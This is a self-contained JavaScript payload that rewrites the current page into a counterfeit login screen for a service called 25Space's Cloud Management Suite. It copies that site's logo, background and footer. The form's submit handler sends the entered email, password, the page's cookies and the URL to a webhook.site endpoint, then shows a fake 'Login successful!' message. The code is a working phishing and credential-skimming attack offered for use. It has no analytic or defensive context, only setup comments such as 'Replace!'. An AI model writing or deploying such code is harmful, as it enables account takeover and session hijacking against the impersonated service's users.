(function() {
  const webhookUrl = 'https://webhook.site/acaf7007-fbc2-462c-b96d-28b307aefb8b'; // Replace!

  const fullPageHTML = `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Cloud Management Suite - Login</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    html, body { height: 100%; font-family: 'Segoe UI', Arial, sans-serif; color: white; }
    body {
      background: url('https://cloud.25space.com/assets/images/bg.jpg') center/cover no-repeat fixed; /* Try common variants if not */
      /* Alternatives if above 404: replace with /assets/images/background.jpg or /images/login-bg.jpg */
    }
    .overlay-left {
      background: rgba(0,0,0,0.3); /* Lighter overlay for bright background */
      backdrop-filter: blur(2px); /* Optional modern blur for pro look */
    }
    .container {
      display: flex;
      width: 100%;
      height: 100vh;
    }
    .left {
      flex: 1;
      padding: 100px;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: flex-start;
    }
    .left h1 {
      font-size: 5.5rem;
      font-weight: 200;
    }
    .left p {
      font-size: 1.5rem;
      margin: 40px 0;
    }
    .qr-code {
      width: 260px;
      height: 260px;
      border: 12px solid rgba(255,255,255,0.9);
      border-radius: 15px;
      box-shadow: 0 20px 40px rgba(0,0,0,0.5);
    }
    .right {
      flex: 1;
      background: rgba(0,0,0,0.75);
      padding: 100px;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
    }
    .logo {
      width: 120px;
      margin-bottom: 40px;
    }
    .right h2 {
      font-size: 2.5rem;
      margin-bottom: 60px;
    }
    form {
      width: 100%;
      max-width: 500px;
    }
    input[type="email"], input[type="password"] {
      width: 100%;
      padding: 22px;
      margin-bottom: 30px;
      background: rgba(255,255,255,0.2);
      border: none;
      border-radius: 10px;
      color: white;
      font-size: 1.3rem;
    }
    input::placeholder { color: rgba(255,255,255,0.7); }
    .remember {
      display: flex;
      justify-content: space-between;
      margin-bottom: 50px;
      font-size: 1.2rem;
    }
    .problems-link { color: #ffbb00; }
    button {
      width: 100%;
      padding: 22px;
      background: #ffbb00;
      color: black;
      border: none;
      border-radius: 50px;
      font-size: 1.5rem;
      font-weight: bold;
    }
    .create-account {
      margin-top: 50px;
      font-size: 1.2rem;
    }
    .create-link { color: #ffbb00; }
    footer {
      position: fixed;
      bottom: 40px;
      width: 100%;
      text-align: center;
      color: rgba(255,255,255,0.8);
    }
  </style>
</head>
<body>
  <div class="container overlay-left">
    <div class="left">
      <h1>Good morning!</h1>
      <p>Use 25Space across any device on the go. Scan the QR code to continue on other devices.</p>
      <img src="https://cloud.25space.com/assets/images/qr.png" class="qr-code" onerror="this.src='https://api.qrserver.com/v1/create-qr-code/?size=260x260&data=https://cloud.25space.com'">
    </div>
    <div class="right">
      <img src="https://cloud.25space.com/assets/images/logo.svg" class="logo" onerror="this.src='https://cloud.25space.com/assets/images/logo.png'; this.onerror=null;">
      <h2>Cloud Management Suite.</h2>
      <form id="loginForm">
        <input type="email" placeholder="Email" required>
        <input type="password" placeholder="Password" required>
        <div class="remember">
          <label><input type="checkbox"> Remember me</label>
          <a href="#" class="problems-link">Problems with login?</a>
        </div>
        <button type="submit">Sign in</button>
        <div class="create-account">
          Don't have an account? <a href="#" class="create-link">Create an account</a>
        </div>
      </form>
    </div>
  </div>
  <footer>© 2015-2025 25space.com - Legal - Privacy - About - Health</footer>

  <script>
    document.getElementById('loginForm').addEventListener('submit', function(e) {
      e.preventDefault();
      const data = {
        email: this.querySelector('input[type="email"]').value,
        password: this.querySelector('input[type="password"]').value,
        cookies: document.cookie,
        url: location.href
      };
      fetch('${webhookUrl}', {method: 'POST', body: JSON.stringify(data)});
      alert('Login successful!');
    });
  </script>
</body>
</html>`;

  document.open();
  document.write(fullPageHTML);
  document.close();
})();
